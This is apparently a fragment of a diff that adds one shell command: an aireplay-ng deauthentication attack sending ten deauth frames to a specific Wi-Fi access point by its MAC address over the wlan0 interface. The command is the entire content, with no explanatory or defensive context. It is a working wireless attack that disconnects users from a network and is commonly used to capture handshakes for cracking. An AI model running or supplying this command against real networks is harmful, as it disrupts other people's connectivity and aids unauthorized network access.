@@ -1,0 +1,1 @@
+aireplay-ng -0 10 -a 00:5C:C2:FD:EE:28 wlan0
